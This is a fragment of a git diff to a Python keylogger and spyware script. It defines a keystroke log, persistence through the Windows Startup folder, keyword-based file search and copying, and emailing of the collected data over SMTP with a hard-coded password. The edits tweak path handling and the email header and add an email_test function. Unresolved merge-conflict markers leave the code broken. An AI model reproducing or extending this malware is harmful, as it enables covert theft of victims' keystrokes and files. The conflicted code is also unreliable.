@@ -154,7 +154,7 @@ class Constants(object):
     READ_MODE = 'r'
     MAX_LOG_SIZE = 1000000
     WORD_LIST = ["shimon", "with"]
-    DESTINATION_FOLDER_PATH = os.path.join(USER_PATH, r"\Documents\test")
+    DESTINATION_FOLDER_PATH = USER_PATH + r"\Documents\test"
     CHROME_PROCESS_NAME = "chrome.exe"
     ENDLINE = "\n"
     KEY_STROKES_LOG = os.path.join(USER_PATH, r"Documents\kslog.txt")
@@ -167,7 +167,7 @@ class Constants(object):
     EMAIL_PASSWORD = "nattanshimon"
     STARTUP_LOCATION = USER_PATH + r"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
     FIRST_TIME = "FIRSTtime.txt"
-    FIRST_TIME_DIR = os.path.join(USER_PATH, r"\Documents\tks")
+    FIRST_TIME_DIR = USER_PATH + r"\Documents\tks"
     FIRST_TIME_ALL_DIR = os.path.join(FIRST_TIME_DIR, FIRST_TIME)
     SELF_lOCATION = os.path.abspath(__file__)
     PYTHON_DEFAULT_LOCATION = ""
@@ -333,7 +333,7 @@ class Email(object):
 
     def __init__(self):
         self.header = 'From: %s\n' % Constants.EMAIL_SOURCE
-        self.header += 'To: %s\n' % ','.join(Constants.EMAIL_DESTINATION)
+        self.header += 'To: %s\n' % ','.join(Constants.EMAIL_DESTINATION_LIST[1])
         self.header += 'Cc: %s\n' % ','.join(Constants.EMAIL_CC_LIST)
         self.header += 'Subject: %s\n\n' % Constants.EMAIL_SUBJECT_HEADER
         self.server = smtplib.SMTP(Constants.EMAIL_SERVER_NAME)
@@ -459,16 +459,28 @@ def kickOff():
     keylogger_mail_thread.start()
     stop_keylogger_mail_thread.start()
 
+<<<<<<< HEAD
     #Start the threads for file copy
     searching_thread.start()
     stop_searching_thread.start()
 
     #Start the threads for emailing
+=======
+    # Start the threads for file copy
+    searching_thread.start()
+    stop_searching_thread.start()
+
+    # Start the threads for emailing
+>>>>>>> origin/master
     email_thread.start()
     
 
 
-
+def email_test():
+    email_controller = Email()
+    email_controller.startserver()
+    email_controller.sendemail("Hello from ")
+    email_controller.stopserver()
 
 # import winreg
 # key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -479,4 +491,5 @@ def kickOff():
 if __name__ == "__main__":
     # call your code here
     kickOff()
+    # email_test()
 
